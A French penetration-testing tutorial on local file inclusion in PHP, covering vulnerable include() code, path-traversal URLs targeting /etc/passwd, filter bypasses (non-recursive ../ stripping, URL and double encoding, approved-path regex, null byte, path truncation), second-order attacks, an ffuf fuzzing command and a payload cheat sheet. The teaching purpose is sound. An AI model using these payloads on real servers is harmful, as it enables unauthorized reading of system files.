# Inclusion de fichiers locale (LFI)

Une vulnérabilité d'inclusion de fichier locale permet de lire (et parfois d'exécuter) des fichiers présents sur le serveur en manipulant un paramètre que l'application utilise pour charger du contenu dynamique. C'est le point de départ de toute exploitation liée aux inclusions de fichiers.

## Pourquoi

Les applications web utilisent fréquemment des paramètres pour charger des pages ou des templates dynamiquement. Quand un développeur passe directement l'entrée utilisateur à une fonction d'inclusion sans validation, on peut détourner le chemin pour lire n'importe quel fichier accessible par le processus web. Les conséquences vont de la simple lecture de `/etc/passwd` à l'exécution de code si la fonction utilisée le permet.

## Comment ça marche

### LFI de base

Le scénario le plus simple : un paramètre contrôle directement le fichier inclus.

```php
if (isset($_GET['language'])) {
    include($_GET['language']);
}
```

Si l'entrée est passée telle quelle à `include()`, on peut remplacer la valeur attendue par un chemin absolu :

```
http://<IP_CIBLE>:<PORT>/index.php?language=/etc/passwd
```

Sur un serveur Linux, `/etc/passwd` est un bon fichier de test : il est lisible par tous et confirme immédiatement la vulnérabilité. Sur Windows, on peut tester avec `C:\Windows\boot.ini` ou `C:\Windows\System32\drivers\etc\hosts`.

{% hint style="info" %}
Quand le fichier inclus contient du code PHP, il est exécuté par le moteur PHP au lieu d'être affiché en clair. Pour lire le code source, il faut utiliser des filtres PHP (abordés dans une autre section).
{% endhint %}

### Traversée de répertoire (Path Traversal)

En pratique, le paramètre est rarement utilisé seul. Le développeur ajoute souvent un préfixe de répertoire :

```php
include("./languages/" . $_GET['language']);
```

Si on envoie `/etc/passwd`, le chemin final devient `./languages//etc/passwd`, qui n'existe pas. La solution : remonter l'arborescence avec la séquence `../` (répertoire parent) jusqu'à atteindre la racine.

```
http://<IP_CIBLE>:<PORT>/index.php?language=../../../../etc/passwd
```

Chaque `../` remonte d'un niveau. Si l'application est dans `/var/www/html/languages/`, on est à 4 niveaux de la racine, donc `../../../../` suffit. En cas de doute, ajouter des `../` supplémentaires ne pose aucun problème : une fois à la racine, `../` reste à la racine.

{% hint style="success" %}
Pour optimiser un payload (dans un rapport ou un exploit), calcule le nombre exact de `../` nécessaires. Depuis `/var/www/html/`, 3 niveaux suffisent (`../../../`). Mais par défaut, en mettre 8 ou 10 fonctionne aussi.
{% endhint %}

### Préfixe de nom de fichier

Certains développeurs ajoutent un préfixe au paramètre pour construire le nom de fichier :

```php
include("lang_" . $_GET['language']);
```

Si on envoie `../../../etc/passwd`, le chemin devient `lang_../../../etc/passwd`, ce qui est invalide. Pour contourner cette situation, on préfixe la valeur avec `/` :

```
http://<IP_CIBLE>:<PORT>/index.php?language=/../../../etc/passwd
```

Le préfixe `lang_` est alors traité comme un nom de répertoire (`lang_/`). Si ce répertoire n'existe pas, la traversée relative peut échouer, mais dans de nombreuses configurations cela fonctionne.

{% hint style="warning" %}
Un préfixe ajouté au paramètre peut aussi casser d'autres techniques d'exploitation (wrappers PHP, RFI). Il faut toujours tester le comportement exact de l'application.
{% endhint %}

### Extension ajoutée

Un autre cas fréquent : l'application ajoute une extension au paramètre.

```php
include($_GET['language'] . ".php");
```

Avec cette configuration, envoyer `/etc/passwd` produit `/etc/passwd.php`, qui n'existe pas. Plusieurs techniques permettent de contourner cette restriction (voir la section Contournements ci-dessous).

### Attaques de second ordre

Les attaques de second ordre exploitent le fait que certaines fonctionnalités utilisent des données stockées en base pour construire un chemin de fichier.

Par exemple, une application qui télécharge l'avatar d'un utilisateur via `/profile/$username/avatar.png`. Si on crée un compte avec le nom d'utilisateur `../../../etc/passwd`, l'application cherchera `/profile/../../../etc/passwd/avatar.png`, ce qui peut être exploité selon le contexte.

Le principe : empoisonner une entrée en base de données (inscription, profil, commentaire), puis attendre qu'une autre fonctionnalité utilise cette valeur pour construire un chemin de fichier. Les développeurs protègent souvent les paramètres directs mais font confiance aux valeurs issues de leur base de données.

## En pratique : contournements courants

### Filtres de traversée non récursifs

Le filtre le plus basique supprime les occurrences de `../` :

```php
$language = str_replace('../', '', $_GET['language']);
```

Ce filtre s'exécute une seule fois sur la chaîne d'entrée. Si on envoie `....//`, le filtre retire `../` du milieu et il reste `../`. Le contournement fonctionne parce que le filtre n'est pas appliqué récursivement sur le résultat.

```
http://<IP_CIBLE>:<PORT>/index.php?language=....//....//....//....//etc/passwd
```

D'autres variantes fonctionnent aussi :
- `..././` (le filtre retire `../` et il reste `../`)
- `....\/` (barre oblique inversée)
- `....////` (barres obliques supplémentaires)

{% hint style="info" %}
Pour qu'un filtre soit efficace, il doit être récursif : continuer à supprimer `../` tant que la chaîne en contient. Un simple `str_replace` ne suffit pas.
{% endhint %}

### Encodage URL

Certains filtres bloquent les caractères `.` ou `/` dans l'entrée. On peut contourner cette restriction en encodant ces caractères en URL :

| Caractère | Encodage URL | Double encodage |
|-----------|-------------|-----------------|
| `.`       | `%2e`       | `%252e`         |
| `/`       | `%2f`       | `%252f`         |
| `\`       | `%5c`       | `%255c`         |

La séquence `../` encodée devient `%2e%2e%2f`. Le serveur décode la valeur avant de la passer à la fonction d'inclusion, reconstituant ainsi le chemin de traversée :

```
http://<IP_CIBLE>:<PORT>/index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
```

Si un simple encodage ne passe pas, le double encodage (`%252e%252e%252f`) peut fonctionner quand l'application décode l'entrée deux fois (une fois par le serveur web, une fois par l'application).

{% hint style="warning" %}
Certains outils d'encodage URL n'encodent pas le point (`.`) car il fait partie du schéma URL standard. Pour cette technique, il faut encoder tous les caractères, y compris les points.
{% endhint %}

### Chemins autorisés (Approved Paths)

Certaines applications vérifient via une expression régulière que le chemin commence par un répertoire autorisé :

```php
if(preg_match('/^\.\/languages\/.+$/', $_GET['language'])) {
    include($_GET['language']);
} else {
    echo 'Illegal path specified!';
}
```

On contourne cette vérification en commençant le payload par le chemin autorisé, puis en utilisant la traversée de répertoire :

```
http://<IP_CIBLE>:<PORT>/index.php?language=./languages/../../../../etc/passwd
```

La regex valide l'entrée (elle commence bien par `./languages/`), mais la traversée nous ramène à la racine du système de fichiers.

{% hint style="success" %}
Ce contournement peut être combiné avec les précédents. Par exemple, si le filtre supprime aussi `../`, on utilise `./languages/....//....//....//....//etc/passwd`.
{% endhint %}

### Troncature de chemin (PHP < 5.3)

Sur les anciennes versions de PHP (avant 5.3/5.4), les chaînes sont limitées à 4096 caractères. Tout ce qui dépasse est tronqué. De plus, PHP supprime les `/` en fin de chaîne et les raccourcis `.` dans les chemins.

On exploite ce comportement en créant un chemin très long qui atteint la limite de 4096 caractères. L'extension ajoutée (`.php`) est alors tronquée :

```bash
# Generer un payload de troncature
echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
```

Le chemin commence par un répertoire inexistant (nécessaire pour que la technique fonctionne), suivi de la traversée vers le fichier cible, puis de `./` répété jusqu'à dépasser 4096 caractères.

### Injection de null byte (PHP < 5.5)

Sur les versions de PHP antérieures à 5.5, l'injection d'un octet nul (`%00`) termine la chaîne. Tout ce qui suit est ignoré par la fonction d'inclusion :

```
http://<IP_CIBLE>:<PORT>/index.php?language=../../../../etc/passwd%00
```

Le chemin final envoyé à `include()` est `../../../../etc/passwd%00.php`. Le null byte coupe la chaîne, et le fichier effectivement inclus est `../../../../etc/passwd`.

{% hint style="danger" %}
Ces deux dernières techniques (troncature et null byte) ne fonctionnent que sur d'anciennes versions de PHP. Sur les versions modernes (7.x, 8.x), elles sont corrigées. Cependant, on rencontre encore des serveurs legacy en production.
{% endhint %}

## Pièges et galères

- **Chemins relatifs vs absolus** : si le paramètre est passé directement à `include()` sans préfixe, un chemin absolu (`/etc/passwd`) fonctionne directement. Avec un préfixe de répertoire, la traversée relative (`../../../`) est nécessaire.
- **Erreurs PHP désactivées** : en production, les erreurs sont masquées. Un fichier qui n'existe pas retourne simplement une page vide ou partielle. Il faut comparer les tailles de réponse pour détecter une inclusion réussie.
- **Permissions du processus web** : le fichier doit être lisible par l'utilisateur sous lequel tourne le serveur web (souvent `www-data`). Des fichiers comme `/etc/shadow` ne seront pas accessibles sans élévation de privilèges.
- **Filtres combinés** : une application peut utiliser plusieurs protections simultanément (regex de chemin + suppression de `../` + extension ajoutée). Il faut les identifier et les contourner dans l'ordre.

## Retour terrain

En pentest, la première chose à faire quand on suspecte une LFI est de tester `/etc/passwd` avec différents niveaux de traversée. Si ça ne passe pas, on essaie les contournements dans cet ordre : `....//`, encodage URL, double encodage, puis chemin autorisé. C'est rapide et couvre la majorité des cas.

Les attaques de second ordre sont souvent négligées lors des audits automatisés. Si une application permet de stocker du texte libre (nom d'utilisateur, commentaire, préférence) et qu'une autre fonctionnalité utilise cette valeur pour charger un fichier, il y a un vecteur potentiel. Pensez à tester les champs d'inscription et de profil.

Sur Exegol, les wordlists LFI de SecLists sont disponibles directement. Un fuzzing rapide avec `ffuf` permet de confirmer la vulnérabilité et d'identifier le bon payload :

```bash
ffuf -w /opt/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ \
     -u "http://<IP_CIBLE>:<PORT>/index.php?language=FUZZ" \
     -fs <TAILLE_REPONSE_NORMALE>
```

## Mémo express

| Situation | Payload | Notes |
|-----------|---------|-------|
| Pas de filtre, pas de préfixe | `/etc/passwd` | Chemin absolu direct |
| Préfixe de répertoire | `../../../../etc/passwd` | Adapter le nombre de `../` |
| Préfixe de nom de fichier | `/../../../etc/passwd` | Le `/` initial traite le préfixe comme un répertoire |
| Extension `.php` ajoutée | Voir filtres PHP ou null byte | Dépend de la version PHP |
| Filtre `str_replace('../','')` | `....//....//....//etc/passwd` | Contournement non récursif |
| Filtre sur `.` et `/` | `%2e%2e%2f%2e%2e%2f...etc%2fpasswd` | Encodage URL complet |
| Double décodage | `%252e%252e%252f` | Quand le serveur décode deux fois |
| Regex chemin autorisé | `./languages/../../../../etc/passwd` | Commencer par le chemin attendu |
| PHP < 5.5, extension ajoutée | `../../../../etc/passwd%00` | Null byte tronque l'extension |
| PHP < 5.3, extension ajoutée | `non_existing/../../../etc/passwd/./` x2048 | Troncature à 4096 caractères |

***
